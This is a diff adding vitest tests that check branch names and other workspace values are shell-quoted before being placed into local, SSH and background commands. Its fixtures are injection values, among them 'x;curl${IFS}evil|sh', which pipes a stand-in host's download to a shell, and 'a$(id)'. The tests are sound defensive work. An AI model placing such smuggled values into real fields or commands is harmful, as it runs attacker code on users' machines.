@@ -94,6 +94,7 @@ describe('execution locations', () => {
     managedSessions,
     hosts,
     ssh,
+    projectName: () => 'My App',
   };
   const locations = createExecutionLocations(dependencies);
   const originalPlatform = process.platform;
@@ -386,6 +387,18 @@ describe('execution locations', () => {
       });
     });
 
+    it("quotes the workspace's values in a Terminal Command for the remote posix shell", () => {
+      const location = locations.resolve(sshWorkspace({ branchName: 'x;curl${IFS}evil|sh' }));
+
+      expect(
+        location.buildCommand('cd {{worktreePath}} && git push origin {{branchName}}', {
+          commandKind: 'host',
+        })
+      ).toEqual({
+        command: "cd '/home/dev/work tree' && git push origin 'x;curl${IFS}evil|sh'",
+      });
+    });
+
     it('trusts the Antigravity working directory the remote shell reports', () => {
       expect(
         locations
@@ -474,6 +487,24 @@ describe('execution locations', () => {
       });
     });
 
+    it("quotes the workspace's values in a Terminal Command", () => {
+      expect(
+        build(
+          'git push origin {{branchName}} && echo "{{projectName}} in {{worktreePath}}"',
+          { commandKind: 'host' },
+          { branchName: 'a$(id)' }
+        )
+      ).toEqual({
+        command: `git push origin 'a$(id)' && echo "My App in ${workspaceDir}"`,
+      });
+    });
+
+    it("leaves the workspace's values in an agent's command as typed", () => {
+      expect(build('claude "on {{branchName}}"', undefined, { branchName: 'main' })).toEqual({
+        command: 'claude "on {{branchName}}"',
+      });
+    });
+
     it('runs host commands as given', () => {
       expect(build('npm install', { commandKind: 'host' })).toEqual({ command: 'npm install' });
     });
@@ -485,6 +516,14 @@ describe('execution locations', () => {
 
   describe('background runs', () => {
     const handlers = () => ({ onData: vi.fn(), onExit: vi.fn(), onError: vi.fn() });
+
+    it("quotes the workspace's values in a background command", () => {
+      expect(
+        locations
+          .resolve(localWorkspace({ branchName: "it's" }))
+          .resolveLaunchVariables('git log {{branchName}}')
+      ).toBe(`git log 'it'"'"'s'`);
+    });
 
     it('spawns in the local Workspace repository', () => {
       const run = locations
